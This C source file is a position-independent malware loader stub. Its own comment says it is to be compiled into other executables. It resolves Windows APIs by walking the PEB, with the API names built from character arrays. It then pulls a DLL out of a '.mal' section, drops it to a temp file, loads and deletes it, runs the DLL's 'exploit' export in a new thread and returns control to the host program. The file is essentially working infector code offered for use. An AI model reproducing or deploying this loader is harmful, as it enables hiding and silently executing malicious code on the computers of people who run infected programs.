#include <Windows.h>

/*
	Created By Yoav Shaharabani.
	This code will be compiled into PIC and will find the dll inside .mal section
	then will load it into memory, create thread with the exploit exported function and after that will call
	main function.
*/


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID BaseAddress;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

#ifdef _WIN64
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[21];
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    BYTE Reserved3[520];
    PVOID PostProcessInitRoutine;
    BYTE Reserved4[136];
    ULONG SessionId;
} PEB, * PPEB;
#else
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    LPVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    LPVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, * PPEB;
#endif


int m_stricmp(char* lpA, char* lpB)
{
    while ((char)*lpA)
    {
        char letterA = 0, letterB = 0;
        if (!(char)*lpB)
        {
            return 1;
        }
        letterA = *lpA;
        letterB = *lpB;
        if (letterA >= 97 && letterA <= 122)
            letterA = letterA - 32;

        if (letterB >= 97 && letterB <= 122)
            letterB = letterB - 32;

        if (letterA != letterB)
            return 1;

        lpA++;
        lpB++;
    }
    if ((char)*lpB)
        return 1;

    return 0;
}

int m_wstricmp(wchar_t* lpA, wchar_t* lpB)
{
    while ((WCHAR)*lpA)
    {
        WCHAR letterA = 0, letterB = 0;
        if (!(WCHAR)*lpB)
        {
            return 1;
        }
        letterA = *lpA;
        letterB = *lpB;
        if (letterA >= 97 && letterA <= 122)
            letterA = letterA - 32;

        if (letterB >= 97 && letterB <= 122)
            letterB = letterB - 32;

        if (letterA != letterB)
            return 1;

        lpA++;
        lpB++;
    }
    if ((WCHAR)*lpB)
        return 1;

    return 0;
}

void m_memset(char* lpA, char val, unsigned int size)
{
    for (size_t i = 0; i < size; i++)
    {
        lpA[i] = val;
    }
}

HMODULE _GetModuleHandle(wchar_t* lpName)
{

    // Get the base address of PEB struct
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (pPeb && pPeb->Ldr)
    {
        PPEB_LDR_DATA pLdr = pPeb->Ldr;
        PLIST_ENTRY pHeaderOfModuleList = &(pLdr->InLoadOrderModuleList);
        if (pHeaderOfModuleList->Flink != pHeaderOfModuleList) {
            PLDR_DATA_TABLE_ENTRY pEntry = NULL;
            PLIST_ENTRY pCur = pHeaderOfModuleList->Flink;

            /* Searching for the BaseAddress of LDR_DATA_TABLE_ENTRY corresponding to lpName. */
            do {
                pEntry = CONTAINING_RECORD(pCur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
                if (m_wstricmp(pEntry->BaseDllName.Buffer, lpName) == 0) {
                    return (HMODULE)pEntry->BaseAddress;
                    break;
                }
                pEntry = NULL;
                pCur = pCur->Flink;
            } while (pCur != pHeaderOfModuleList);
        }
    }

    return NULL;

}

FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpName)
{
    UINT_PTR dwModule = (UINT_PTR)hModule;
    if (!hModule || !lpName)
        return NULL;

    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)dwModule;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    /* Needs only 32 bit dlls. */
    PIMAGE_NT_HEADERS pImageNTHeaders = (PIMAGE_NT_HEADERS)(dwModule + pImageDosHeader->e_lfanew);
    if (pImageNTHeaders->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    if (pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return NULL;

    DWORD pImageEntryExportRVA = pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwModule + pImageEntryExportRVA);
    PDWORD pNameTable = (PDWORD)(dwModule + pImageExportDirectory->AddressOfNames);

    for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
        if (!m_stricmp((char*)lpName, (char*)dwModule + pNameTable[i])) {
            PWORD pOrdinalTable = (PWORD)(dwModule + pImageExportDirectory->AddressOfNameOrdinals);
            PDWORD pAddressTable = (PDWORD)(dwModule + pImageExportDirectory->AddressOfFunctions);
            DWORD dwAddressOffset = pAddressTable[pOrdinalTable[i]];
            return (FARPROC)(dwModule + dwAddressOffset);
        }
    }

    return NULL;
}

BYTE* GetDataFromSectionName(UINT_PTR dwBase, char* lpSectionName, DWORD* dwSize)
{
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)dwBase;
    PIMAGE_NT_HEADERS pImageNTHeaders = (PIMAGE_NT_HEADERS)(dwBase + pImageDosHeader->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pImageNTHeaders);
    for (size_t i = 0; i < pImageNTHeaders->FileHeader.NumberOfSections; i++, pSection++)
    {
        if (!m_stricmp((char*)pSection->Name, lpSectionName))
        {
            *dwSize = pSection->Misc.VirtualSize;
            return dwBase + (BYTE*)pSection->VirtualAddress;
        }
    }
    *dwSize = 0;
    return NULL;
}

typedef FARPROC(WINAPI* typeGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* typeGetModuleHandle)(LPCSTR);
typedef DWORD(WINAPI* typeGetTempPathW)(DWORD, LPWSTR);
typedef UINT(WINAPI* typeGetTempFileNameW)(LPCWSTR, LPCWSTR, UINT, LPWSTR);
typedef HANDLE(WINAPI* typeCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD , HANDLE);
typedef BOOL(WINAPI* typeWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* typeCloseHandle)(HANDLE);
typedef HMODULE(WINAPI* typeLoadLibraryW)(LPCWSTR);
typedef BOOL(WINAPI* typeDeleteFileW)(LPCWSTR);
typedef HANDLE(WINAPI* typeCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* typeWaitForSingleObject)(HANDLE, DWORD);
typedef int(WINAPI* typeMessageBox)(HWND, LPCWSTR, LPCWSTR, UINT);

typedef void(WINAPI* typeExploit)();
typedef int(WINAPI* typeMain)();

int main()
{
    DWORD szJmpTo[] = { 0 };
    char szSectionName[] = { '.', 'm', 'a', 'l', 0};
    char szExploit[] = { 'e', 'x', 'p', 'l', 'o', 'i', 't', 0 };


    WCHAR wszKernel[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
    HMODULE hKernelModule = _GetModuleHandle(wszKernel);

    char szGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
    typeGetProcAddress mGetProcAddress = (typeGetProcAddress)_GetProcAddress(hKernelModule, szGetProcAddress);

    char szGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
    typeGetModuleHandle mGetModuleHandleA = (typeGetModuleHandle)mGetProcAddress(hKernelModule, szGetModuleHandleA);

    char szGetTempPathW[] = { 'G', 'e', 't', 'T', 'e', 'm', 'p', 'P', 'a', 't', 'h', 'W', 0 };
    typeGetTempPathW mGetTempPathW = (typeGetTempPathW)mGetProcAddress(hKernelModule, szGetTempPathW);

    char szGetTempFileNameW[] = { 'G', 'e', 't', 'T', 'e', 'm', 'p', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'W', 0 };
    typeGetTempFileNameW mGetTempFileNameW = (typeGetTempFileNameW)mGetProcAddress(hKernelModule, szGetTempFileNameW);

    char szCreateFileW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0 };
    typeCreateFileW mCreateFileW = (typeCreateFileW)mGetProcAddress(hKernelModule, szCreateFileW);

    char szWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0 };
    typeWriteFile mWriteFile = (typeWriteFile)mGetProcAddress(hKernelModule, szWriteFile);

    char szCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    typeCloseHandle mCloseHandle = (typeCloseHandle)mGetProcAddress(hKernelModule, szCloseHandle);

    char szLoadLibraryW[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
    typeLoadLibraryW mLoadLibraryW = (typeLoadLibraryW)mGetProcAddress(hKernelModule, szLoadLibraryW);

    char szDeleteFileW[] = { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0 };
    typeDeleteFileW mDeleteFileW = (typeDeleteFileW)mGetProcAddress(hKernelModule, szDeleteFileW);

    char szCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    typeCreateThread mCreateThread = (typeCreateThread)mGetProcAddress(hKernelModule, szCreateThread);

    char szWaitForSingleObject[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    typeWaitForSingleObject mWaitForSingleObject = (typeWaitForSingleObject)mGetProcAddress(hKernelModule, szWaitForSingleObject);

    WCHAR szUser32[] = {'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0};
    HMODULE hUser32 =  mLoadLibraryW(szUser32);

    //char szMessageBox[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    //typeMessageBox mMessageBox = (typeMessageBox)mGetProcAddress(hUser32, szMessageBox);

    WCHAR szTempPath[MAX_PATH];
    m_memset((char*)szTempPath, 0, MAX_PATH * sizeof(WCHAR));

    WCHAR szJIT[] = { 'J', 'I', 'T', 0 };
    mGetTempPathW(MAX_PATH, szTempPath);
    mGetTempFileNameW(szTempPath, szJIT, 0, szTempPath);

    // Get DLL from section named ".VAR"
    DWORD dwNumberOfBytes = 0;
    UINT_PTR dwBase = (UINT_PTR)mGetModuleHandleA(NULL);
    LPVOID lpDllData = GetDataFromSectionName((UINT_PTR)dwBase, szSectionName, &dwNumberOfBytes);
    if (!lpDllData)
        return 3;
    
    HANDLE hDLL = mCreateFileW(szTempPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    mWriteFile(hDLL, lpDllData, dwNumberOfBytes, &dwNumberOfBytes, NULL);
    mCloseHandle(hDLL);

    UINT_PTR mInjectedDllBase = (UINT_PTR)mLoadLibraryW(szTempPath);

    typeExploit mExploit = (typeExploit)mGetProcAddress((HMODULE)mInjectedDllBase, szExploit);



    mDeleteFileW(szTempPath);

    

    HANDLE h = mCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mExploit, NULL, 0, 0);
    
    //mMessageBox(NULL, szTempPath, szTempPath, 0);

    __asm
    {
        mov eax, dwBase
        add eax, szJmpTo
        call eax;
    }

    return 0;

}









